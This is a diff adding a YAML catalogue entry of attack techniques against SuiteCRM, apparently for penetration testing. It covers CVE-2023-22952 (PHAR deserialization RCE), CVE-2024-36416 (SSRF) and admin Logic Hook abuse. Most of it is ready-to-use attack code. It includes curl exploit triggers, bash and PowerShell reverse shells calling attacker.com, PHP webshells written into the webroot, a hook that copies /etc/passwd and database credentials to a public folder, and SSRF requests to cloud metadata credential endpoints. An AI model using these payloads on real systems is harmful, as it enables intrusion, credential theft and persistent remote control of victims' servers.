@@ -1,0 +1,225 @@
+---
+comment: "SuiteCRM is an open-source PHP CRM (fork of SugarCRM) widely deployed on-premise.\n\
+  \nCVE-2023-22952 (CVSS 9.8): Unauthenticated RCE in SuiteCRM < 7.12.8 and < 8.2.0.\n\
+  The vulnerability exists in the email-based Forgot Password flow: the `email`\n\
+  parameter is processed without adequate sanitisation, allowing an attacker to inject\n\
+  a PHAR:// stream wrapper URI. PHP's PHAR extension deserialises the archive metadata\n\
+  using available SuiteCRM gadget classes, achieving arbitrary code execution as the\n\
+  web server user (commonly www-data or apache). Some public writeups describe an\n\
+  overlapping code path via the UploadFile entry point \u2014 the precise trigger\
+  \ point\nvaries across minor releases; the net result is unauthenticated RCE in\
+  \ all affected\nversions. Ref: https://www.exploit-db.com/exploits/51114 / nuclei:\
+  \ CVE-2023-22952\n\nCVE-2024-36416 (CVSS 8.8): Authenticated SSRF in SuiteCRM <\
+  \ 7.14.4. The vCard\nimport feature fetches a user-supplied URL server-side without\
+  \ restricting targets,\nallowing any authenticated user to probe internal services\
+  \ and cloud metadata endpoints.\n\nAdmin-level: SuiteCRM's Studio module and Logic\
+  \ Hook mechanism allow administrators\nto execute arbitrary PHP on CRM events. Logic\
+  \ Hooks are PHP files placed in\ncustom/Extension/modules/<Module>/Ext/LogicHooks/\
+  \ and invoked automatically on\nrecord save, delete, and other lifecycle events.\
+  \ No restart is required.\n"
+functions:
+  file-read:
+  - code: |
+      <?php
+      // Admin Logic Hook file read: place in custom/Extension/modules/Contacts/Ext/LogicHooks/read_hook.php
+      function read_hook($bean, $event, $arguments) {
+          $content = file_get_contents('/etc/passwd');
+          file_put_contents(SUGAR_BASE_DIR . '/cache/out.txt', $content);
+      }
+      ?>
+    comment: |
+      Admin Logic Hook file read: the hook reads an arbitrary server-side file and
+      writes its content to the publicly accessible cache directory.
+      Fetch the result at: http://victim.com/cache/out.txt
+      Key targets: /etc/passwd, SuiteCRM config files (config.php, config_override.php)
+      which contain the database credentials in plaintext.
+    contexts:
+      admin:
+  rce:
+  - code: |
+      # CVE-2023-22952: Unauthenticated RCE via PHAR deserialization in the Forgot Password flow
+      # Step 1: craft a PHAR archive containing a serialized SuiteCRM gadget chain payload
+      # Step 2: host the PHAR at http://attacker.com/evil.phar
+      # Step 3: trigger PHAR deserialization via the email parameter
+
+      curl -s -X POST "http://victim.com/index.php?entryPoint=forgotPassword" \
+        --data-urlencode "email=phar://path/to/evil.phar/test"
+
+      # Alternatively, use the public PoC which automates gadget chain construction:
+      # python3 51114.py http://victim.com attacker.com 12345
+      # Ref: https://www.exploit-db.com/exploits/51114
+    comment: |
+      CVE-2023-22952: The SuiteCRM Forgot Password endpoint passes the user-supplied
+      email value into a PHP stream wrapper context without sanitisation. Injecting a
+      phar:// URI causes PHP to deserialize the PHAR archive metadata using SuiteCRM's
+      own classes as a gadget chain, achieving RCE as the web server user.
+      The exact code path differs between 7.x and 8.x branches; in both cases the
+      end result is unauthenticated PHP deserialization leading to OS command execution.
+      nuclei: CVE-2023-22952
+      Ref: https://www.exploit-db.com/exploits/51114
+    contexts:
+      unauthenticated:
+    version: |
+      < 7.12.8 / < 8.2.0
+  - code: |
+      <?php
+      // Admin Logic Hook: place in custom/Extension/modules/Contacts/Ext/LogicHooks/rce_hook.php
+      // Then add the hook registration in custom/modules/Contacts/logic_hooks.php
+
+      // hook file content (rce_hook.php):
+      function rce_hook($bean, $event, $arguments) {
+          $output = shell_exec($_GET['c'] ?? 'id');
+          file_put_contents('/tmp/rce_out.txt', $output);
+      }
+      ?>
+    comment: |
+      Admin Logic Hook RCE: SuiteCRM executes PHP files registered as Logic Hooks on
+      module lifecycle events (save, delete, after_retrieve, etc.). An admin can place
+      arbitrary PHP in custom/Extension/modules/<Module>/Ext/LogicHooks/ and register
+      it in the module's logic_hooks.php. The hook fires server-side on the next
+      matching event (e.g., saving any Contact record) without requiring a server restart.
+      Navigate to Admin > Repair > Quick Repair and Rebuild to load the new hook file.
+      This is documented as expected admin functionality, not a CVE.
+    contexts:
+      admin:
+  reverse-shell:
+  - blind: true
+    code: |
+      # CVE-2023-22952: unauthenticated reverse shell via PHAR deserialization
+      # Use the public PoC (EDB-51114) which builds the PHAR gadget chain and
+      # triggers the deserialization automatically:
+      # python3 51114.py http://victim.com attacker.com 12345
+      #
+      # Manual alternative: craft a PHAR containing a __destruct gadget that calls:
+      bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1'
+    comment: |
+      CVE-2023-22952: reverse shell via PHAR deserialization in the Forgot Password flow.
+      The PHP gadget chain's __destruct method is used to execute a bash reverse shell
+      payload. The connection back to the attacker arrives before the HTTP response
+      completes. Runs as the web server user (commonly www-data).
+      Ref: https://www.exploit-db.com/exploits/51114
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+    version: |
+      < 7.12.8 / < 8.2.0
+  - blind: true
+    code: |
+      <?php
+      // Admin Logic Hook reverse shell (Linux)
+      // Place in custom/Extension/modules/Contacts/Ext/LogicHooks/revshell_hook.php
+      function revshell_hook($bean, $event, $arguments) {
+          exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &");
+      }
+      ?>
+    comment: |
+      Admin Logic Hook reverse shell for Linux: runs on the next matching CRM event
+      (e.g., saving any Contact). The exec() call is fire-and-forget with a trailing &
+      so the HTTP response completes normally. Check the listener for the incoming
+      connection. Register the hook and trigger with Admin > Repair > Quick Repair and
+      Rebuild, then save any Contact record.
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: linux
+    tty: false
+  - blind: true
+    code: |
+      <?php
+      // Admin Logic Hook reverse shell (Windows)
+      // Place in custom/Extension/modules/Contacts/Ext/LogicHooks/revshell_hook.php
+      function revshell_hook($bean, $event, $arguments) {
+          $ps = '$c=New-Object Net.Sockets.TCPClient("attacker.com",12345);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}';
+          $cmd = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "' . $ps . '"';
+          popen($cmd, 'r');
+      }
+      ?>
+    comment: |
+      Windows variant: Admin Logic Hook that spawns a PowerShell reverse shell on the
+      next matching CRM lifecycle event. Uses popen() to launch PowerShell detached
+      from the PHP process. Register and trigger the same way as the Linux variant.
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: windows
+    tty: false
+  ssrf:
+  - code: |
+      # CVE-2024-36416: authenticated SSRF via vCard import URL fetch
+      # Step 1: log in with any valid account (admin or standard user)
+      curl -s -c /tmp/sc.jar -X POST "http://victim.com/index.php" \
+        -d "module=Users&action=Authenticate&user_name=admin&user_password=admin&return_url=%2Findex.php"
+
+      # Step 2: trigger the SSRF by submitting a vCard import with an internal URL
+      curl -s -b /tmp/sc.jar -X POST "http://victim.com/index.php?module=Contacts&action=ImportVCard" \
+        -F "vcard_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+      # Target cloud metadata endpoints:
+      # AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      # GCP:        http://metadata.google.internal/computeMetadata/v1/
+      # Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
+    comment: |
+      CVE-2024-36416: SuiteCRM's vCard import feature fetches a user-supplied URL
+      server-side without restricting targets to external or safe addresses. Any
+      authenticated user can point the vcard_url parameter to an internal service
+      or cloud metadata endpoint. The response content may be reflected in error
+      messages or logged, leaking internal network information.
+      nuclei: CVE-2024-36416
+    contexts:
+      authenticated:
+    version: |
+      < 7.14.4
+  - code: "# Admin SSRF via outbound email test (SMTP connection probe)\n# Navigate\
+      \ to Admin > Email Settings and set the SMTP host to an internal target:\n#\
+      \ SMTP Server: 169.254.169.254  Port: 80\n# Click \"Send Test Email\" \u2014\
+      \ SuiteCRM will attempt a TCP connection to the address,\n# and the error message\
+      \ will reveal whether the port is open (connection refused vs timeout).\n"
+    comment: "Admin-level semi-blind SSRF via the outbound SMTP configuration test.\
+      \ SuiteCRM\nattempts to connect to the configured SMTP host and port when \"\
+      Send Test Email\"\nis clicked in Admin > Email Settings. The resulting error\
+      \ message differs between\nopen and closed/filtered ports, enabling internal\
+      \ network port scanning.\nNo CVE assigned \u2014 this is a common pattern across\
+      \ web applications with configurable\noutbound email settings.\n"
+    contexts:
+      admin:
+  webshell:
+  - code: |
+      # CVE-2023-22952: drop a PHP webshell via the PHAR gadget chain
+      # Craft a PHAR whose gadget chain writes a webshell to the SuiteCRM webroot:
+      # file_put_contents('/var/www/html/suitecrm/shell.php', '<?php system($_GET["c"]); ?>');
+      #
+      # Trigger deserialization via the Forgot Password endpoint:
+      curl -s -X POST "http://victim.com/index.php?entryPoint=forgotPassword" \
+        --data-urlencode "email=phar://path/to/evil.phar/test"
+      #
+      # Access the dropped webshell:
+      curl "http://victim.com/shell.php?c=id"
+    comment: |
+      CVE-2023-22952: the PHAR gadget chain can be used to write a PHP webshell to the
+      SuiteCRM document root instead of (or in addition to) spawning a shell. Adjust
+      the target path to the actual webroot of the installation.
+      Common paths: /var/www/html/suitecrm/, /opt/bitnami/suitecrm/
+    contexts:
+      unauthenticated:
+    version: |
+      < 7.12.8 / < 8.2.0
+  - code: |
+      <?php
+      // Admin Logic Hook webshell: place in custom/Extension/modules/Contacts/Ext/LogicHooks/ws_hook.php
+      function ws_hook($bean, $event, $arguments) {
+          $shell = SUGAR_BASE_DIR . '/cache/shell.php';
+          if (!file_exists($shell)) {
+              file_put_contents($shell, '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>');
+          }
+      }
+      ?>
+    comment: |
+      Admin Logic Hook webshell: on the first matching CRM event the hook writes a PHP
+      webshell to the SuiteCRM cache directory (publicly accessible under the webroot).
+      Access at: http://victim.com/cache/shell.php?c=id
+      SUGAR_BASE_DIR resolves to the SuiteCRM installation root at runtime.
+    contexts:
+      admin:
+...
